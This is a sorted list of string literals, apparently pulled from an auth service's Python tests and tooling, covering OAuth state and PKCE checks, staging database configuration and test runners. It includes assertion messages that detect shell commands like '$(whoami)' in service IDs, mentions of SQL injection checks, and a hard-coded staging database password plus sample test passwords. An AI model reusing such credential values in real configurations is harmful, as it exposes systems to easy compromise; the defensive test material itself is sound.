    "OAuth State Parameter Security Tests\nTesting Level: Unit (L1)\nFocus: OAuth state parameter security implementation\n\nBusiness Value Justification (BVJ):\n- Segment: All (Free, Early, Mid, Enterprise) \n- Business Goal: Security, Compliance, Trust\n- Value Impact: Prevents CSRF attacks and OAuth hijacking\n- Strategic Impact: Critical for platform security compliance and user trust\n\nOAuth Basics Coverage:\n- State parameter generation (cryptographically secure)\n- State parameter validation (timing-safe comparison)\n- State parameter expiration handling\n- State parameter uniqueness enforcement\n- CSRF protection through state binding",
    "OAuth URL",
    "OAuth URL missing redirect_uri parameter:",
    "OAuth callback endpoint not available:",
    "OAuth callback endpoint not found - Google cannot complete OAuth flow",
    "OAuth callback endpoint not found:",
    "OAuth config for",
    "OAuth deployment checklist documented",
    "OAuth endpoint not implemented",
    "OAuth flow tests",
    "OAuth initiation failed with status",
    "OAuth initiation failed:",
    "OAuth initiation returned",
    "OAuth initiation using frontend URL - CRITICAL ERROR!\nRedirect URI:",
    "OAuth initiation using incorrect redirect_uri!\nExpected auth service:",
    "OAuth monitoring requirements documented",
    "OAuth provider connectivity loss causing Auth Service to hang",
    "OAuth provider connectivity loss not handled, got",
    "OAuth providers not yet implemented",
    "OAuth redirect URI contains dangerous character '",
    "OAuth redirect URI incorrect for",
    "OAuth redirect URI incorrectly uses frontend domain:",
    "OAuth redirect URI misconfiguration detected!\nExpected auth service URL:",
    "OAuth redirect URI misconfigured for",
    "OAuth redirect URI not in Google Console required list for",
    "OAuth redirect URI should use HTTPS in staging:",
    "OAuth redirect URI using frontend URL in",
    "OAuth redirect URI validation test:",
    "OAuth redirect URI:",
    "OAuth redirect_uri not using auth service URL!\nExpected prefix:",
    "OAuth redirect_uri using frontend URL!\nFrontend URL:",
    "OAuth security import failed:",
    "OAuth state missing required field '",
    "OAuth state nonce too short:",
    "OAuth state parameter is empty:",
    "OAuth validation errors for",
    "OAuth validation script requirements documented",
    "OAuthTokenFactory",
    "OK",
    "OK - Configured",
    "OK: setup_test_path() at line",
    "OPEN",
    "OPENAI_API_KEY",
    "OPTIMIZED TEST EXECUTION RESULTS",
    "OPTIONS",
    "OPTIONS method should be supported on",
    "OPTIONS requests should be supported for CORS",
    "OPTIONS response should include CORS headers",
    "OR",
    "OVERRIDE_TEST_ENV",
    "OWASP ZAP",
    "Only check files changed in git diff",
    "Only client ID",
    "Only generate report, no fixes (SAFE, default)",
    "Only one async attempt should succeed, got",
    "Only one concurrent attempt should succeed, got",
    "Only run tests matching given mark expression",
    "Only run tests matching the given keyword expression",
    "Only run tests matching the given pattern",
    "Open Cypress interactive runner",
    "Operation '",
    "Operation cancellation not handled properly",
    "Operation cancelled. Good choice!",
    "OperationalError",
    "OperationalError: database does not exist",
    "Optimization level",
    "Optimization:",
    "Optimize",
    "Optimize CPU-intensive operations",
    "Optimize database queries",
    "Optimized Backend Test Runner - 100x Productivity Gains",
    "Optimized Backend Test Runner - 100x Productivity Gains\n\nUltra-high performance test execution with intelligent parallelization,\nresource monitoring, caching, and fail-fast mechanisms for maximum efficiency.\n\nBusiness Value Justification (BVJ):\n- Segment: All customer segments (development infrastructure)\n- Business Goal: Achieve 100x faster test cycles for rapid deployment\n- Value Impact: Enables continuous deployment with sub-minute test execution\n- Revenue Impact: Accelerates time-to-market by 90%, reduces CI/CD costs by 80%\n\nUsage:\n    python scripts/test_backend_optimized.py --category unit\n    python scripts/test_backend_optimized.py --optimize-aggressive\n    python scripts/test_backend_optimized.py --benchmark",
    "Optimized execution failed:",
    "Optimizing function",
    "Optional service failed",
    "Options:",
    "Origin",
    "Original:",
    "Output GitHub Actions annotations",
    "Output file for report",
    "Output file path",
    "Output file path (default: print to console)",
    "Output file path for the report",
    "Output format",
    "Output results as JSON",
    "Output:",
    "Overall Result:",
    "Overall compliance rate:",
    "Overall:",
    "PASS",
    "PASS: .env.staging correctly removed",
    "PASS: Auth service correctly configured to skip .env loading in staging",
    "PASS: Backend app correctly configured to skip .env loading in staging",
    "PASS: Deployment script has all necessary configurations",
    "PASSED",
    "PASSED (",
    "PASSWORD",
    "PASSWORD_CHANGE",
    "PASSWORD_RESET",
    "PATCH",
    "PATCH should return 405 on /auth/login, got:",
    "PERFORMANCE SUMMARY",
    "PERMISSION_GRANTED",
    "PERMISSION_REVOKED",
    "PHASE",
    "PHASE 1: Fixing syntax errors...",
    "PHASE 2: Fixing size violations...",
    "PHASE 3: Final validation...",
    "PKCE challenge validation failed",
    "PKCE validation crashed on None input:",
    "PKCE validation should be case sensitive",
    "PKCE validation should fail for malformed challenges",
    "PKCE validation should fail gracefully with malformed input",
    "PKCE validation should fail with empty verifier/challenge",
    "PKCE validation should fail with mismatched verifier/challenge",
    "PKCE validation should handle unicode input gracefully, not crash",
    "PKCE validation should succeed with matching verifier/challenge",
    "PORT",
    "POST",
    "POSTGRES_DB",
    "POSTGRES_HOST",
    "POSTGRES_PASSWORD",
    "POSTGRES_PASSWORD=postgres-password-staging",
    "POSTGRES_PORT",
    "POSTGRES_SSLMODE",
    "POSTGRES_USER",
    "POSTGRES_db",
    "PRE-DEPLOYMENT OAUTH VALIDATION SCRIPT REQUIREMENTS:\n=====================================================",
    "PRIORITY FAILURES (Critical/High)",
    "PR_NUMBER",
    "PYTEST_CURRENT_TEST",
    "PYTHONPATH",
    "Parallel Efficiency:",
    "Parallel Safe:",
    "Parallel:",
    "Pass Rate:",
    "Passed",
    "Passed:",
    "Password Hashing Basic Tests - Business Impact\n\nSecurity Foundation: User Account Protection\n- Ensures secure password hashing for all local authentication flows\n- Validates password verification accuracy and prevents authentication bypasses  \n- Critical foundation for user account security and authentication integrity\n\nTechnical Excellence:\n- Hash uniqueness: ensures each password hash is unique preventing rainbow table attacks\n- Verification accuracy: tests both correct and incorrect password scenarios\n- Format consistency: validates Argon2id format and security parameters\n- Edge case handling: tests malformed inputs and boundary conditions\n- Performance validation: ensures hashing/verification completes in reasonable time\n- Concurrent safety: validates thread-safe password operations for production scalability\n\nPlatform Security:\n- Foundation: Secure password handling foundation for all local user authentication\n- Security: Comprehensive hashing validation prevents password-related vulnerabilities\n- Performance: Fast verification ensures responsive authentication experience  \n- Reliability: Edge case testing ensures robust password handling in production\n- Integrity: Hash format validation maintains cryptographic security standards",
    "Password changed",
    "Password hash should use Argon2id variant",
    "Password hashing took too long:",
    "Password is missing from staging DATABASE_URL",
    "Password must contain at least one digit",
    "Password must contain at least one lowercase letter",
    "Password must contain at least one special character",
    "Password must contain at least one uppercase letter",
    "Password required for local auth",
    "Password too long",
    "Password too short: minimum",
    "Password verification should fail for wrong password:",
    "Password verification should succeed",
    "Password verification should succeed for:",
    "Password verification took too long:",
    "Password:",
    "Pattern check results:",
    "Perform OAuth operation that uses Redis/memory store",
    "Perform analysis without making changes",
    "Perform dry run without making changes (SAFE, default)",
    "Perform ultra-thinking deep analysis",
    "Performance Grade:",
    "Performance Simulator\n\nThis module simulates performance patterns including cascading failures and bottlenecks.",
    "Performance and SLA validation tests",
    "Performance benchmark tests",
    "PerformanceSimulator",
    "PerformanceTest123!",
    "Permission Test Data Factory\nCreates test permission data for role-based access control testing.\nSupports various permission patterns and user permission assignments.",
    "Permission checks bypassed when database is down",
    "PermissionFactory",
    "PermissionRequest schema does not default to staging",
    "Permissions must be a list",
    "Phase",
    "Please check test configuration.",
    "Please review failures before deploying.",
    "Please review the failed tests and fix the issues",
    "Please review violations manually and implement proper solutions.",
    "Please start PostgreSQL with:",
    "Pool size:",
    "Pool size: 5, Max overflow: 10",
    "Pool status doesn't provide error details about why connections are invalid. Should specify that postgres database doesn't exist.",
    "Pool status lacks specific error details:",
    "Port allocation test failed:",
    "Port allocation working: service1=",
    "Port:",
    "Post-deployment:",
    "PostgreSQL Async Configuration Test",
    "PostgreSQL container not available:",
    "PostgreSQL version:",
    "PostgresDB",
    "Postgres_Db",
    "Potential circular dependencies detected",
    "Pre-deployment error",
    "Pre-deployment validation failures:",
    "Pre-deployment:",
    "Predictable OAUTH_HMAC_SECRET not detected: '",
    "Preferred splitting strategy",
    "Priority failures:",
    "Priority:",
    "Problematic files found in excluded directories:",
    "Process a specific file",
    "Process integration tests first (default: True)",
    "Processed",
    "Processed:",
    "Processing",
    "Processing Batch",
    "Processing complete!",
    "Processing first",
    "Processing specific file:",
    "Processing:",
    "Production Environment",
    "Production should fail fast but got:",
    "Production uses auth.netrasystems.ai",
    "Productivity Gain:",
    "Progress display mode (default: simple)",
    "Progress:",
    "Prohibited Frontend URLs (DO NOT ADD):",
    "Prohibited:",
    "Project root directory",
    "Project root:",
    "Project-Only Real Test Requirements Validator\n\nValidates only project test files against SPEC/testing.xml real test requirements.\nExcludes virtual environments and external libraries.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction\n- Value Impact: Prevents regression from invalid test patterns in our code\n- Strategic Impact: Ensures test reliability and system integrity",
    "Proposed new files:",
    "Protects",
    "Protocol",
    "Provider server error",
    "Provider states should be isolated",
    "Provider unavailable",
    "Python files to process",
    "QUALITY METRICS:",
    "Quick Test",
    "Quick frontend test runner that handles no-tests case properly",
    "Quick script to run tests against the actual staging environment.\n\nUsage:\n    python scripts/test_staging.py           # Run all staging tests\n    python scripts/test_staging.py --quick   # Run quick health checks only\n    python scripts/test_staging.py --full    # Run comprehensive staging tests",
    "Quick script to verify that test scanning is excluding site-packages and virtual environments",
    "Quick smoke tests for basic functionality",
    "Quick test failure scanner - identifies failing tests efficiently",
    "Quick validation test",
    "Quick validation tests (<30s)",
    "RATE_LIMITING_ENABLED",
    "READY",
    "REAL_LLM",
    "RECOMMENDATION",
    "RECOMMENDATION:",
    "RECOMMENDATIONS:",
    "REDIS_DB",
    "REDIS_DISABLED",
    "REDIS_HOST",
    "REDIS_PORT",
    "REDIS_URL",
    "REDUNDANT TEST",
    "REFRESH_TOKEN_EXPIRE_DAYS",
    "REGION",
    "REGRESSION DETECTED: Problematic pattern found in auth_routes.py!\nPattern:",
    "REGRESSION: No correct OAuth redirect_uri patterns found!\nExpected patterns:",
    "RESULTS",
    "ROOT CAUSE: auth_routes.py uses _determine_urls()[1] instead of _determine_urls()[0]\nIMPACT: Google never calls auth service - OAuth flow completely broken",
    "RS256",
    "RS384",
    "RS512",
    "RUNNING FRONTEND UNIT TESTS",
    "RUNNING REAL E2E TESTS:",
    "RUNNING SIMPLIFIED UNIT TESTS",
    "Rapid health checks took too long:",
    "Rate limit exceeded",
    "Rate limiting and DDoS protection tests",
    "React\\.createContext\\(\\w*mock\\w*\\)",
    "Readiness check reports 'ready' despite database issues:",
    "Readiness check reports ready despite netra_dev database being unavailable. Service should not be ready when database connectivity is broken.",
    "Readiness check reports ready without validating database connectivity. When netra_dev database is inaccessible, readiness check should fail.",
    "Readiness endpoint bypasses database validation in development mode:",
    "Readiness endpoint returned status",
    "Readiness separation test failed:",
    "Readiness vs health separation working correctly",
    "Real LLM Coverage:",
    "Real Service Test Metrics Tracking\nULTRA DEEP THINK: Module-based architecture - Metrics tracking extracted for 450-line compliance",
    "Real Test Requirements Linter\n\nIntegrates into development workflow to enforce real test requirements.\nCan be used as pre-commit hook, CI check, or standalone validation.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction\n- Value Impact: Prevents test anti-patterns from entering codebase\n- Strategic Impact: Maintains test reliability and system integrity\n\nUsage:\n  python scripts/compliance/real_test_linter.py [--fix] [--strict] [file1 file2 ...]\n  \nOptions:\n  --fix     Attempt to automatically fix violations\n  --strict  Fail on any violations (for CI)\n  --files   Specific files to check (default: all project test files)",
    "Real Test Requirements Validator\n\nValidates test files against SPEC/testing.xml real test requirements:\n1. No mock component implementations inside test files\n2. Integration tests use real child components  \n3. Files must not exceed 300 lines\n4. Functions must not exceed 8 lines\n5. Minimal mocking (only external APIs)\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction\n- Value Impact: Prevents regression from invalid test patterns\n- Strategic Impact: Ensures test reliability and system integrity",
    "Realistic Test Data Models and Configuration\n\nThis module defines models, enums, and configuration data for realistic test data generation.",
    "Realistic Test Data Service\n\nBackward compatibility module that imports from the new modular structure.\nGenerates production-like test data for comprehensive testing.\nAddresses gaps identified in test_realism_analysis_20250811.md",
    "Realistic Test Data Service Module\n\nGenerates production-like test data for comprehensive testing.\nThis module addresses gaps identified in test realism analysis and provides\nrealistic patterns for LLM responses, logs, workloads, and performance scenarios.",
    "Realistic test data module - consolidates test data functionality.",
    "RealisticDataPatterns",
    "RealisticTestDataConfigManager",
    "RealisticTestDataService",
    "Reason:",
    "Received response:",
    "Recommendation: Manually refactor based on these suggestions.",
    "Recommendations:",
    "Recommended approach:",
    "Recommended splitting strategies:",
    "Recovery attempt",
    "Recovery from degraded state not detected. Recovery tracking:",
    "Redirect URI doesn't match staging",
    "Redirect URI:",
    "Redirect to: [cyan]",
    "Redis URL should not use localhost in staging, got:",
    "Redis cleanup timeout:",
    "Redis close error:",
    "Redis connection failed",
    "Redis connection hanging during Cloud Run shutdown",
    "Redis connection lost",
    "Redis container not available:",
    "Redis down",
    "Redis not available for connection testing",
    "Redis not available for health monitoring test",
    "Redis not available for recovery testing",
    "Redis session cleanup hanging during shutdown",
    "Redis session cleanup hanging prevented graceful shutdown",
    "Redis should be in degraded services",
    "Redis-dependent tests",
    "RedisTestMixin",
    "Reduce mocking by using real components and external API mocks only",
    "Reduce mocking in",
    "Refactor",
    "Referer",
    "Refresh token duration:",
    "Refresh token should be valid",
    "Refresh token should work initially",
    "Registration temporarily disabled",
    "Remaining L3 files:",
    "Remaining syntax errors:",
    "Remove duplicate test setup code from all test files.\n\nThis script finds and removes the duplicate sys.path manipulation code\nthat appears in hundreds of test files, ensuring only the centralized\nsetup_test_path() function is used.",
    "Remove expired sessions from database",
    "Remove or mark redundant tests",
    "Remove sessions inactive for specified days",
    "Removed original file",
    "Removing",
    "Renaming:",
    "Replace hardcoded sleeps in",
    "Replace mocks with real components or move to unit tests",
    "Replace with proper function signature and real implementation",
    "Replace with real data source or move to test fixtures",
    "Replace with real implementation or move to test directory",
    "Replaced UserFlowTestBase with unittest.TestCase",
    "Replaced pattern:",
    "Replay of auth code should be prevented",
    "Report format (default: text)",
    "Report saved to",
    "Report saved to:",
    "Report-only mode. Use --force-unsafe-fix and --confirm-unsafe for actual changes (NOT RECOMMENDED)",
    "Report:",
    "Reproduces: Error while closing socket [Errno 9] Bad file descriptor\n        Root Cause: Inadequate container lifecycle management",
    "Reproduces: Invalid token: Signature verification failed\n        Root Cause: Fragmented secret management",
    "Reproduces: JWT security validation error: Not enough segments\n        Root Cause: No validation of OAuth response completeness",
    "Reproduces: OAuth callback error: invalid_client (401)\n        Root Cause: Cross-environment credential misuse",
    "Reproduces: connect() got an unexpected keyword argument 'sslmode'\n        Root Cause: Missing SSL parameter compatibility handling",
    "Reproduces: password authentication failed for user 'postgres'\n        Root Cause: No pre-deployment validation framework",
    "Request '",
    "Request processed in 45ms",
    "Request processed successfully",
    "Request timeout",
    "Require Real LLM:",
    "Require Real Services:",
    "Required Authorized Redirect URIs:",
    "Required in Google Console:",
    "Reset tables using canonical auth_db if needed for test isolation",
    "Resilience and recovery validation tests",
    "Resource cleanup failed during disposal",
    "Resource cleanup successful",
    "Resource cleanup test failed:",
    "Resource leak detected:",
    "Response:",
    "Result",
    "Result:",
    "Results saved to:",
    "Results will be saved to:",
    "Results:",
    "Resume execution from specific category",
    "Retry attempt 1 of 3",
    "Reuse attempt",
    "Revenue-critical path tests (1-2min)",
    "Review recent deployments",
    "Review service dependencies",
    "Review shared fixtures and utilities",
    "Revoke all sessions for a user",
    "Root",
    "Root directory to scan",
    "Root endpoint returned status",
    "Root endpoint returned unexpected service:",
    "Run E2E tests with Cypress",
    "Run ESLint",
    "Run Jest in watch mode",
    "Run TypeScript type checking",
    "Run all WebSocket functionality tests.",
    "Run all coordination fix validation tests.",
    "Run all initialization tests.",
    "Run all integration tests",
    "Run all staging deployment tests",
    "Run all tests",
    "Run autonomous test review based on mode",
    "Run benchmark comparison with standard execution",
    "Run comprehensive staging tests",
    "Run integration tests separately with proper services running",
    "Run iterative test-fix loop",
    "Run multiple categories (e.g., '--categories unit integration api')",
    "Run previously failed tests first",
    "Run quick staging health checks only",
    "Run quick validation only",
    "Run specific category (e.g., 'unit', 'integration', 'api')",
    "Run tests against staging environment",
    "Run tests from a specific category",
    "Run tests in parallel",
    "Run tests matching pattern",
    "Run tests to validate they pass before suggesting fixes",
    "Run the complete E2E test suite.",
    "Run with --verbose to see details",
    "Running 'alembic current'...",
    "Running Backend Startup Tests",
    "Running Cypress E2E Tests",
    "Running ESLint...",
    "Running End-to-End Tests",
    "Running Frontend Startup Tests",
    "Running Jest Tests",
    "Running TypeScript type check...",
    "Running auth service startup integration tests...",
    "Running command:",
    "Running command:\n  pytest",
    "Running test:",
    "Running tests...",
    "Running verify_workflow_status.py validation tests...",
    "Running:",
    "SAFE MODE ENABLED: Only analysis and dry-run operations allowed",
    "SAFETY: Actual file splitting is disabled by default. Use force_unsafe=True if you really want to modify files (NOT RECOMMENDED). Consider manual refactoring instead.",
    "SAFETY: Automatic function refactoring is disabled. This operation is too dangerous for automatic execution. Please refactor manually.",
    "SAFETY: Cannot perform actual fixes in safe mode. Use dry_run=True for suggestions or explicitly set safe_mode=False and force_unsafe=True (NOT RECOMMENDED).",
    "SAFETY: Cannot perform actual fixes with safe mode enabled",
    "SAFETY: Unsafe operations require --confirm-unsafe flag. Please reconsider using manual refactoring instead.",
    "SCAN COMPLETE",
    "SECRET",
    "SECRET_MANAGER_PROJECT_ID",
    "SECURITY ISSUE: Token blacklist must persist across service restarts",
    "SECURITY ISSUE: User blacklist must persist across service restarts",
    "SELECT",
    "SELECT * FROM information_schema.tables WHERE table_schema = 'public'",
    "SELECT 1",
    "SELECT 1 FROM auth_users LIMIT 1",
    "SELECT 1 as test_value",
    "SELECT COUNT(*) FROM pg_user",
    "SELECT current_database()",
    "SELECT expires_at FROM auth_sessions WHERE id = :session_id",
    "SELECT id FROM auth_sessions WHERE refresh_token_hash = :token",
    "SELECT id FROM auth_users WHERE id = :user_id",
    "SELECT name FROM sqlite_master WHERE type='table' AND name='auth_users'",
    "SELECT name FROM sqlite_master WHERE type='table';",
    "SELECT tablename FROM pg_tables WHERE tablename LIKE 'auth_%'",
    "SELECT user_id FROM auth_sessions WHERE refresh_token_hash = :token",
    "SELECT version()",
    "SERIALIZABLE",
    "SERVICE COORDINATION FIX VALIDATION SUMMARY",
    "SERVICE STARTUP ORCHESTRATION TEST",
    "SERVICE_ID",
    "SERVICE_SECRET",
    "SESSION_CREATED",
    "SESSION_EXPIRED",
    "SESSION_EXPIRE_HOURS",
    "SEVERITY BREAKDOWN:",
    "SHUTDOWN_TIMEOUT_SECONDS",
    "SHUTDOWN_TIMEOUT_SECONDS=",
    "SIGTERM handler exceeded timeout in staging:",
    "SIGTERM handler timeout:",
    "SIGTERM handling completed in",
    "SIMULATING",
    "SLA compliance and incident prevention for",
    "SOME TESTS FAILED",
    "SPEC",
    "SQLException",
    "SQLMap",
    "SQL_ECHO",
    "SSL Certificate Validation",
    "SSL Parameter Handling",
    "SSL TEST SUMMARY",
    "SSL certificate expiry not handled gracefully:",
    "SSL configuration issues:",
    "SSL configured:",
    "SSL connection FAILED:",
    "SSL connection failure replicated:",
    "SSL connection: SUCCESS",
    "SSL parameter conversion issues:",
    "SSL parameter missing for regular connection",
    "SSL parameters in Cloud SQL URL",
    "SSL parameters present as expected",
    "SSL parameters present in Cloud SQL URL",
    "SSL parameters should be removed",
    "SSL parameters should be removed for Cloud SQL",
    "SSL parameters still present in Cloud SQL URL:",
    "SSL validation: Not applicable (Unix socket handles encryption)",
    "SSL/authentication method mismatch",
    "SSOT-Compliant Test Database Configuration\nAll database operations MUST use auth_service.auth_core.database.connection.auth_db\n\nThis file provides SSOT-compliant helpers for test database operations.\nNO duplicate engine creation or session management.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: SSOT compliance and reduced maintenance burden  \n- Value Impact: Eliminates duplicate database connection logic\n- Strategic Impact: Single source of truth for all auth database operations",
    "STAGING",
    "STAGING CONFIGURATION SIMPLIFICATION TEST",
    "STAGING DEPLOYMENT VALIDATION TEST SUITE",
    "STAGING ENVIRONMENT TEST RUNNER",
    "STAGING ENVIRONMENT TEST SUITE",
    "STAGING ERROR MONITOR LOGIC VALIDATION",
    "STAGING STARTUP SEQUENCE TESTS",
    "STAGING_API_URL",
    "STAGING_AUTH_URL",
    "STAGING_DATABASE_URL",
    "STAGING_FRONTEND_URL",
    "STAGING_REDIS_URL",
    "STAGING_URL",
    "STDERR:",
    "STDOUT:",
    "SUCCESS! PostgreSQL version:",
    "SUCCESS: Alembic can connect to staging database",
    "SUCCESS: All tests passed! Staging is correctly simplified.",
    "SUCCESS: AuthConfig URL connection successful!",
    "SUCCESS: AuthConfig generated correct Cloud SQL URL",
    "SUCCESS: Configuration validation passed",
    "SUCCESS: Connection testing completed successfully",
    "SUCCESS: Credential validation passed",
    "SUCCESS: Direct asyncpg connection successful!",
    "SUCCESS: No test stubs found in production code.",
    "SUCCESS: No tests found in excluded directories (site-packages, venv, etc.)",
    "SUCCESS: No violations found! All conftest.py files are at service-level.",
    "SUCCESS: Renamed to",
    "SUCCESS: Socket path exists:",
    "SUCCESS: TCP connection successful! Version:",
    "SUCCESS: URL construction is working correctly",
    "SUCCESS: URL contains all expected components",
    "SUCCESS: URLs have expected Cloud SQL format",
    "SUGGESTION: Function",
    "SUGGESTION: Refactor",
    "SUMMARY",
    "SUMMARY:",
    "Safe Name",
    "Safety check prevented file splitting:",
    "Save detailed JSON report to file",
    "Scale horizontally to reduce CPU load",
    "Scan Date:",
    "Scan all test directories in codebase",
    "Scan complete:",
    "Scan completed. Found",
    "Scan for test stubs",
    "Scan specific directory",
    "Scan specific file",
    "Scanned",
    "Scanning",
    "Scanning directory:",
    "Scanning file:",
    "Scanning for test failures...",
    "Scanning for test size violations...",
    "Scanning for test stubs...",
    "Scanning for test violations...",
    "Scanning test files in:",
    "Scanning tests...",
    "Scenario '",
    "Schedule tech debt sprint to address",
    "Schema validation correctly failed:",
    "Script to add pytest markers to test files based on their dependencies",
    "Script to fix common syntax errors in test files",
    "Script to standardize L3 test file naming convention\nRenames test_*_l3.py files to test_*.py and updates references",
    "Scripts",
    "Searched locations:",
    "Second allocation failed:",
    "Second create_all should be idempotent but failed:",
    "Second database initialization should also succeed (idempotent)",
    "Second state should be stored successfully",
    "Second table creation should be idempotent but failed:",
    "Second use should be blocked",
    "Second use should be blocked (reuse attack prevention)",
    "Second use should be blocked for",
    "Secret Access",
    "Secret Manager",
    "Secret access test failed:",
    "Secret loader",
    "Secrets failed to load",
    "Security Tests for Auth Service - Critical Security Validation\nTests SQL injection, XSS, CSRF protection, and audit logging",
    "Security bypasses detected when database is broken:",
    "Security scan to",
    "Security scan to '",
    "Security validation passed despite database being unavailable:",
    "Security validation tests",
    "SecurityTest123!",
    "See",
    "Sending ping:",
    "Service '",
    "Service Coordination Fix Validation",
    "Service ID contains curl command remnants:",
    "Service ID contains invalid character '",
    "Service ID contains literal shell command '$(hostname)':",
    "Service ID contains literal shell command '$(whoami)' instead of executed value:",
    "Service ID contains shell artifact '",
    "Service ID contains shell metacharacter '",
    "Service ID contains unexpanded variable ${INSTANCE_ID}:",
    "Service ID contains unexpanded variable ${REGION}:",
    "Service ID contains unprocessed environment variables:",
    "Service ID contains unprocessed nested variables:",
    "Service ID contains unprocessed shell command: '",
    "Service ID contains unprocessed shell pattern '",
    "Service ID hostname shell command error replicated: '",
    "Service ID is literal long shell command:",
    "Service ID is literal shell command:",
    "Service ID is unexpanded template:",
    "Service ID literal shell command error replicated: '",
    "Service ID shows literal Cloud Run metadata command:",
    "Service ID shows literal nested command:",
    "Service ID shows literal shell command in container:",
    "Service ID too long from shell expansion:",
    "Service ID validation failed for malformed ID: '",
    "Service Initialization Order",
    "Service discovery failed with retry logic",
    "Service discovery timing fixes working correctly",
    "Service discovery timing test failed:",
    "Service identification: auth-service",
    "Service incorrectly continues startup despite database errors:",
    "Service incorrectly initialized in 'staging mode' without database connectivity. This compromises all database-dependent features.",
    "Service is incorrectly running with graceful degradation despite database 'netra_dev' not existing. This compromises authentication functionality.",
    "Service should be ready after marking",
    "Service should not be ready initially",
    "Service should not be ready while initializing",
    "Service should not be ready while starting",
    "Service shutdown timeout in Cloud Run environment:",
    "Service starts without database connectivity",
    "Service status is not healthy:",
    "Service temporarily unavailable",
    "Service token decoded successfully:",
    "Service token duration:",
    "Service token should validate across services with same configuration",
    "Service token:",
    "Services are ready for testing!",
    "Services got same port - conflict not prevented",
    "Session",
    "Session Cleanup Job Tests\nTests automated session cleanup and maintenance operations\nFocuses on database cleanup and expired session management",
    "Session Management Tests for Auth Service\nTests complete session lifecycle with database operations\nCovers security, multi-device, and cleanup scenarios",
    "Session Test Data Factory\nCreates test sessions with proper expiration and metadata.\nSupports both active and expired sessions for comprehensive testing.",
    "Session expiration must be after creation time",
    "Session management imports failed:",
    "Session revoked",
    "Session validation temporarily unavailable",
    "Session.",
    "SessionFactory",
    "Sessions not properly validated when database is down",
    "Set up ACTUAL staging credentials from Secret Manager",
    "Set up minimal staging environment variables",
    "Set up staging environment variables",
    "Setup and cleanup for each test",
    "Setup database session for test",
    "Setup test database using SSOT auth_db - preferred method",
    "Severity:",
    "Short timeout",
    "Short1!",
    "Should accept JSON output format",
    "Should accept table output format (default)",
    "Should accept token from",
    "Should accept token when no expected issuer specified",
    "Should allow staging domain, got:",
    "Should be able to delete the key",
    "Should be able to set value in healthy Redis",
    "Should be formatted for asyncpg",
    "Should contain Cloud SQL path",
    "Should decode user ID correctly, got:",
    "Should detect staging environment for CORS config",
    "Should detect test environment during pytest run",
    "Should fail gracefully when missing required arguments",
    "Should fail gracefully with invalid run ID",
    "Should fail gracefully with invalid token",
    "Should fail gracefully with non-existent repository",
    "Should fail when --wait-for-completion used without --workflow-name",
    "Should fail when missing required arguments",
    "Should fail when no GitHub token provided",
    "Should fail when no token provided",
    "Should fail with invalid token",
    "Should fail with non-existent repository",
    "Should fail with non-existent workflow",
    "Should fail:",
    "Should gracefully degrade on Redis errors",
    "Should handle Cloud Run environment",
    "Should handle exceptions gracefully",
    "Should handle invalid JSON gracefully, got:",
    "Should handle malformed token gracefully, but got exception:",
    "Should have 1 pre-deployment error",
    "Should have 2 post-deployment errors",
    "Should have failed with authentication error",
    "Should have failed with invalid token",
    "Should have raised exception",
    "Should indicate CSRF/state validation failure",
    "Should load staging client ID from Secret Manager, got:",
    "Should normalize URL for asyncpg",
    "Should not be in development mode when ENVIRONMENT=staging",
    "Should not contain sslmode parameter, got:",
    "Should not show 'development mode' when ENVIRONMENT=staging",
    "Should not use dev instance ID in staging",
    "Should not use legacy JWT_SECRET when better options available",
    "Should not use localhost in staging, got:",
    "Should not validate",
    "Should not validate sync",
    "Should not warn when GOOGLE_OAUTH_CLIENT_ID_STAGING is set. Log output:",
    "Should not warn when GOOGLE_OAUTH_CLIENT_SECRET_STAGING is set. Log output:",
    "Should prefer GOOGLE_OAUTH_CLIENT_ID_STAGING over GOOGLE_CLIENT_ID, got:",
    "Should prefer GOOGLE_OAUTH_CLIENT_SECRET_STAGING over GOOGLE_CLIENT_SECRET, got:",
    "Should preserve Cloud SQL socket path, got:",
    "Should preserve host, port, and database name",
    "Should preserve permissions, got:",
    "Should preserve service name, got:",
    "Should preserve user email, got:",
    "Should prioritize JWT_SECRET_STAGING in staging environment, got:",
    "Should reject None code verifier",
    "Should reject SQL injection attempts",
    "Should reject challenges that are too short",
    "Should reject empty code verifier",
    "Should reject invalid state parameter",
    "Should reject malformed challenge:",
    "Should reject token from",
    "Should reject unicode challenges",
    "Should request secret '",
    "Should retrieve the same value",
    "Should return 503 for SSL certificate issues, got",
    "Should return CORS origin header for staging domain",
    "Should return False for invalid URL",
    "Should return False for production environment when pytest not detected",
    "Should return False for regular PostgreSQL URLs",
    "Should return None for None user",
    "Should return OAuth configuration data",
    "Should return True for Cloud SQL URLs",
    "Should return True for valid PostgreSQL URL",
    "Should return True when ENVIRONMENT=test",
    "Should return True when TESTING=true",
    "Should return True when running under pytest",
    "Should return empty string when DATABASE_URL not set",
    "Should return string even for malformed URL:",
    "Should return user ID without separate database sync",
    "Should still contain Cloud SQL path",
    "Should store unique state parameter:",
    "Should use asyncpg driver, got:",
    "Should use raw DATABASE_URL from environment",
    "Should use staging defaults when DATABASE_URL not set, got:",
    "Should work after Redis recovery",
    "Show detailed output for each import",
    "Show detailed real e2e test information",
    "Show historical category statistics",
    "Show slowest tests",
    "Show warning messages",
    "Show what would be done without making changes",
    "Shutdown failure caused resource leak:",
    "Shutdown timeout configuration test - Expected:",
    "Shutdown timeout exceeded - database connections failed to close gracefully",
    "Shutdown timeout exceeded after",
    "Shutdown took",
    "Similar:",
    "Simple WebSocket Connectivity Test",
    "Simple WebSocket test client to verify basic connectivity.",
    "Simple frontend test runner",
    "Simple frontend test runner for Netra AI Platform\nMinimal dependencies for use by test_runner.py",
    "Simple functional test to verify WebSocket works in DEV MODE.\n\nThis script tests the actual WebSocket connection functionality by:\n1. Starting the development server\n2. Testing secure WebSocket connection\n3. Verifying bidirectional message flow\n4. Testing authentication and CORS\n5. Cleaning up resources",
    "Simple test fix loop - runs tests and fixes issues iteratively.",
    "Simple test script to verify service startup orchestration.\nTests the core startup sequence without complex integration.",
    "Simple test to validate Auth service database URL construction for staging.\n\nThis test focuses on URL construction logic rather than actual connections,\nsince Unix socket connections cannot be tested on Windows.",
    "SimpleAgent",
    "SimplePass123!",
